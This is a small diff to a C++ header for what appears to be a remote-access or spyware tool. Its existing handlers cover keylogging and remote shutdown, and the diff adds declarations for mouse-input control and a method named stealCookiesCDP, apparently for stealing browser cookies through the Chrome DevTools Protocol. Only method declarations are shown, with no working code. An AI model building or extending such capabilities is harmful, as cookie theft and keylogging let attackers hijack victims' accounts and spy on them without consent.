@@ -29,6 +29,10 @@ public:
     static json startKeylog(const json &);
     static json stopKeylog(const json &);
 
+    static json handleMouseInput(const json &);
+
     static json systemShutdown(const json &);
     static json systemRestart(const json &);
+
+    static json stealCookiesCDP(const json &);
 };
